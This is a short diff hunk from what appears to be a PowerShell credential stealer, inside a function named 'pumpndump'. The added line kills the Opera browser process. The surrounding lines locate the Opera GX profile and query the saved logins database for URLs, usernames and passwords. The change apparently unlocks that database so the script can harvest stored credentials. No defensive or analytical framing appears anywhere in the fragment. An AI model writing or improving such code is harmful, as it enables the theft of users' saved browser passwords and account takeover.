@@ -160,7 +160,7 @@ function pumpndump
 
 # Opera GX
     try {
-
+        Stop-Process -Name "opera"
         $operagx_path = $env:APPDATA + "\Opera Software\Opera GX Stable"
         $query = "SELECT origin_url, username_value, password_value FROM logins WHERE blacklisted_by_user = 0"
 
